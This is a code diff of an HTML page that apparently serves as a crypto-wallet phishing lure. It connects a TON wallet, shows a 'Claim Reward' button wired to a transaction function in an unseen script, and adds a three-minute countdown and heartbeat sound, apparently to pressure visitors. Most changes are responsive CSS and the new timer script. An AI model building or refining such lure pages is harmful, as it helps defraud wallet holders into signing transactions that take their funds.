@@ -9,6 +9,7 @@
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
     
     <style>
+        /* Общие настройки */
         body {
             background: linear-gradient(135deg, #001f3d, #0057b7);
             color: white;
@@ -18,57 +19,68 @@
             flex-direction: column;
             align-items: center;
             justify-content: space-between;
-            height: 100vh;
+            height: 100vh; /* Устанавливаем высоту экрана */
             margin: 0;
             padding: 20px;
+            box-sizing: border-box;
+            overflow: hidden; /* Отключаем прокрутку по высоте */
         }
 
-        header, footer {
+        /* Настройки для шапки */
+        header {
             width: 100%;
             background: rgba(255, 255, 255, 0.1);
-            padding: 15px 0;
+            padding: 10px 0;
+            flex-shrink: 0; /* Чтобы шапка не сжималась */
         }
 
+        /* Заголовок */
         #title {
-            font-size: 36px;
+            font-size: 6vw; /* Сделаем размер шрифта гибким */
             font-weight: bold;
             color: #00aaff;
             text-shadow: 0 0 10px #00aaff;
             margin-bottom: 10px;
         }
 
+        /* Логотип */
         #ton-logo-large {
-            width: 80px;
-            height: 80px;
+            width: 15vw; /* Делаем логотип гибким */
+            height: auto;
             margin-bottom: 10px;
         }
 
+        /* Подзаголовок */
         #subtitle {
-            font-size: 20px;
+            font-size: 5vw; /* Размер шрифта зависит от ширины экрана */
             color: #b0c4de;
             margin-bottom: 20px;
         }
 
+        /* Основной контейнер */
         main {
             flex-grow: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            gap: 30px;
+            gap: 20px;
+            height: auto;
+            overflow-y: auto; /* Добавляем прокрутку для основного контента, если нужно */
         }
 
+        /* Кнопка */
         button {
             background: linear-gradient(90deg, #0088cc, #00aaff);
             color: white;
-            font-size: 22px;
-            padding: 12px 28px;
+            font-size: 5vw; /* Размер шрифта для кнопки */
+            padding: 4vw 8vw;
             border: none;
             border-radius: 8px;
             cursor: pointer;
             transition: 0.3s;
             box-shadow: 0 0 10px #00aaff;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
 
         button:hover {
@@ -76,29 +88,23 @@
             box-shadow: 0 0 20px #00aaff;
         }
 
+        /* Логотипы внизу */
         #logos {
             display: flex;
-            gap: 30px;
-            margin-top: 20px;
+            gap: 5vw;
             justify-content: center;
+            margin-top: 20px;
         }
 
         .logo {
-            width: 50px;
-            height: 50px;
+            width: 10vw; /* Сделаем логотипы более адаптивными */
+            height: auto;
         }
 
-        #dynamic-logos {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 30px;
-            margin-top: 20px;
-        }
-
+        /* Динамичные лого с анимацией */
         .dynamic-logo {
-            width: 60px;
-            height: 60px;
+            width: 15vw; /* Размер динамичных логотипов */
+            height: auto;
             transition: transform 1s ease-in-out;
             animation: heartbeat 1.5s ease-in-out infinite;
         }
@@ -118,23 +124,61 @@
             }
         }
 
+        /* Подвал */
         footer {
-            font-size: 14px;
+            font-size: 4vw; /* Размер шрифта для подвала */
             color: #b0c4de;
             position: relative;
             bottom: 30px;
+            margin-top: 20px;
         }
 
+        /* Таймер */
         #countdown {
-            font-size: 24px;
+            font-size: 6vw; /* Размер шрифта таймера */
             font-weight: bold;
             color: #ff4444;
             margin-top: 20px;
         }
 
+        /* Блок с информацией о кошельке */
         #wallet-info {
-            font-size: 18px;
-            margin-bottom: 30px; /* Место для отображения баланса */
+            font-size: 4vw;
+            margin-bottom: 30px;
+        }
+
+        /* Мобильный дизайн: запрет на прокрутку */
+        @media (max-width: 768px) {
+            main {
+                gap: 15px;
+                height: 100%; /* Устанавливаем контейнер на всю высоту */
+                overflow-y: auto; /* Если нужно, добавляем прокрутку по содержимому */
+            }
+
+            #subtitle {
+                font-size: 6vw;
+            }
+
+            button {
+                font-size: 6vw;
+                padding: 5vw 10vw;
+            }
+
+            #countdown {
+                font-size: 6vw;
+            }
+
+            footer {
+                font-size: 5vw;
+            }
+
+            #logos {
+                gap: 5vw;
+            }
+
+            .logo {
+                width: 15vw;
+            }
         }
     </style>
 </head>
@@ -158,8 +202,8 @@
         <div id="ton-connect"></div>
         <button onclick="didtrans();">🚀 Claim Reward 🚀</button>
         
-        <div id="countdown">Time left: <span id="timer">60</span> seconds</div>
-        
+        <div id="countdown"></div> <!-- Просто сам таймер -->
+
         <div id="logos">
             <img class="logo" src="telegram_logo.png" alt="Telegram">
             <img class="logo" src="ton_logo.png" alt="TON Blockchain">
@@ -177,5 +221,29 @@
     <audio id="heartbeat-sound" src="heartbeat_sound.mp3" loop></audio>
 
     <script src="tonsdk.js"></script>
+    
+    <script>
+        // Функция для обновления таймера
+        function startCountdown() {
+            let timerElement = document.getElementById('countdown');
+            let timeRemaining = 180; // 180 секунд (3 минуты)
+
+            // Функция для обновления времени каждую секунду
+            const countdownInterval = setInterval(function() {
+                if (timeRemaining <= 0) {
+                    clearInterval(countdownInterval); // Останавливаем таймер, когда время истечет
+                    timerElement.innerText = '0'; // Когда время закончится, ставим 0
+                } else {
+                    timerElement.innerText = timeRemaining; // Просто выводим время
+                    timeRemaining--;
+                }
+            }, 1000); // Обновляем каждую секунду
+        }
+
+        // Запуск таймера при загрузке страницы
+        window.onload = function() {
+            startCountdown();
+        };
+    </script>
 </body>  
 </html>
